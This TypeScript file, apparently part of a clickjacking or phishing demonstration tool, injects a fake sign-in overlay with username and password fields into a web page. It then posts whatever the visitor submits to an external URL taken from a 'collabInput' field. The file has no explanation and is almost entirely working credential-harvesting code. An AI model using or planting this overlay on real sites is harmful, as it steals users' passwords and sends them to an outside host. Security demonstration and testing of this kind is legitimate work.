export function clickjackOverlay(): void {
  if (document.getElementById("overlay")) return;

  const link = document.createElement("link");
  link.rel = "stylesheet";
  link.href = "/static/clickjack.css";
  document.head.appendChild(link);

  const overlay = document.createElement("div");
  overlay.id = "overlay";
  overlay.innerHTML = `<form id="signin_form">
    <label>Username:</label>
    <input name="username" id="username" type="text">
    <label>Password:</label>
    <input name="password" id="password" type="password">
    <input type="submit" value="Submit">
  </form>`;

  document.getElementById("wrapper")!.appendChild(overlay);

  const form = overlay.querySelector<HTMLFormElement>("#signin_form")!;
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    void sendData(form);
  });

  const resetBtn = document.getElementById("overlay-reset");
  if (resetBtn) resetBtn.style.display = "inline-block";
}

export function removeOverlay(): void {
  const overlay = document.getElementById("overlay");
  if (overlay) overlay.remove();
  const resetBtn = document.getElementById("overlay-reset");
  if (resetBtn) resetBtn.style.display = "none";
}

async function sendData(form: HTMLFormElement): Promise<void> {
  const collabInput = document.querySelector<HTMLInputElement>('input[name="collabInput"]');
  if (!collabInput?.value) return;

  const formData = new FormData(form);
  try {
    const response = await fetch(collabInput.value, { method: "POST", body: formData });
    console.log(await response.json());
  } catch (e) {
    console.error(e);
  }
}
